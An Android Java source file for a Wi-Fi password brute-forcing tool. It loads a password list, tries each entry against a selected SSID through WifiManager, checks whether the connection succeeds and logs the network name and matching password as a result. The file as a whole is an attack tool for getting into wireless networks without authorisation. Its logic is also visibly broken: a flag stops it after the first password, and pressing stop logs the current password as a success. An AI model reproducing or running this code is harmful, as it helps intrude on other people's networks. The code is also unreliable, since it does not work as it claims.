package BruteFragment;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentResultListener;
import logic.ShowToast;

import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;

import com.linkclink.gfr.R;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

public class BruteFragment extends Fragment {

    int netId = 0;
    /*    */

    private LayoutInflater inflater;
    private ViewGroup container;

    private View view;

    private Button buttonBrute;
    private Button buttonBruteAll;

    private WifiManager wifiManager;
    private WifiConfiguration wifiConfiguration;

    private String currentBruteWifiSSID = null;

    private int flagStartBrute = 0;
    private int flagErrorBrute = 0;
    private int flagBreakBrute = 0;

    private List<String> passwordList = new ArrayList<String>();
    private List<String> passwordUriList = new ArrayList<String>(); /* Not usage */

    private SetLog setLog;
    private CheckWifi checkWifi;
    private UpdatePasswordList updatePasswordList;

    public static BruteFragment newInstance() {
        return new BruteFragment();
    }

    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {

        this.container = container;
        this.inflater = inflater;
        InitialisationComponents();
        wifiManager = (WifiManager) requireContext().getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        setLog = new SetLog(getParentFragmentManager());
        checkWifi = new CheckWifi(wifiManager);
        updatePasswordList = new UpdatePasswordList(passwordList, getContext());

        buttonBrute.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                BruteMain();
            }
        });

        getParentFragmentManager().setFragmentResultListener("selectedWifi", this, new FragmentResultListener() {
            @Override
            public void onFragmentResult(@NonNull String requestKey, @NonNull Bundle result) {
                currentBruteWifiSSID = result.getString("selectedWifi");
            }
        });

        getParentFragmentManager().setFragmentResultListener("passwordUri", this, new FragmentResultListener() {
            @Override
            public void onFragmentResult(@NonNull String requestKey, @NonNull Bundle result) {
                passwordUriList.add(result.getString("passwordUri")); /* Not usage */
                try {
                    setLog.SetLogResult("Update/List Success added " + updatePasswordList.UpdateList(result.getString("passwordUri"))+ " passwords");
                } catch (IOException e) {
                    ShowToast.showToast(getContext(), "Error " + e.getMessage());
                }
            }
        });

        getParentFragmentManager().setFragmentResultListener("stopCurrentProcess", this, new FragmentResultListener() {
            @Override
            public void onFragmentResult(@NonNull String requestKey, @NonNull Bundle result) {
                flagBreakBrute = 1;
            }
        });
        return view;
    }

    /* Components layout initialisation */
    private void InitialisationComponents() {
        view = inflater.inflate(R.layout.brute_fragment, container, false);
        buttonBrute = (Button) view.findViewById(R.id.button_brute);
        buttonBruteAll = (Button) view.findViewById(R.id.button_bruteAll);
    }

    private void BruteMain() {
        flagBreakBrute = 0;
        /* Check HotSpot enabled and disable */
        if (!checkWifi.CheckHotSpotEnabled()) {
            /* Check wifi enabled */
            if (!checkWifi.CheckWifiEnabled()) {
                /* Check empty wif and brute */
                if (!passwordList.isEmpty()) {
                    /* Check empty wifi and brute */
                    if (checkWifi.CheckCurrentWifi(currentBruteWifiSSID)) {
                        Brute();
                    } else ShowToast.showToast(getContext(), "Please selected wifi to brute:");

                } else ShowToast.showToast(getContext(), "Please add passwords list:");

            } else ShowToast.showToast(getContext(), "Please enable Wifi:");

        } else ShowToast.showToast(getContext(), "Please disable HotSpot:");
    }

    /* Test */
    private void Brute() {
        setLog.SetLogCurrentWifi("Brute/Start brute wifi: " + currentBruteWifiSSID);
        setLog.SetLogCurrentWifi(currentBruteWifiSSID);

        /* Test */
        for (int i = 0; i < passwordList.size(); i++) {

            if (flagStartBrute == 0) {

                flagStartBrute = 1;
                /* Remove wifi */
                wifiManager.removeNetwork(netId);

                /* Config */
                wifiConfiguration = new WifiConfiguration();
                wifiConfiguration.SSID = String.format("\"%s\"", currentBruteWifiSSID); /* Set wifi name */
                wifiConfiguration.preSharedKey = String.format("\"%s\"", passwordList.get(i)); /* Set current password */
                /*  */

                /* Try connect */
                netId = wifiManager.addNetwork(wifiConfiguration);
                wifiManager.disconnect();
                wifiManager.enableNetwork(netId, true);
                wifiManager.reconnect();
                /*    */

                try {
                    Thread.sleep(500);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                if (CheckSuccessConnect() | flagBreakBrute == 1) {
                    setLog.SetLogResult("Pass to WIF:" + currentBruteWifiSSID + "Pass: " + passwordList.get(i));
                    setLog.SetLogGoodResults("WIFI: " + currentBruteWifiSSID + " Pass:" + passwordList.get(i));
                    break;
                }
            }
        }
    }

    private boolean CheckSuccessConnect() {
        ConnectivityManager connManager = (ConnectivityManager) requireActivity().getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = Objects.requireNonNull(connManager).getNetworkInfo(ConnectivityManager.TYPE_WIFI);

        return Objects.requireNonNull(mWifi).isConnected();
    }
}
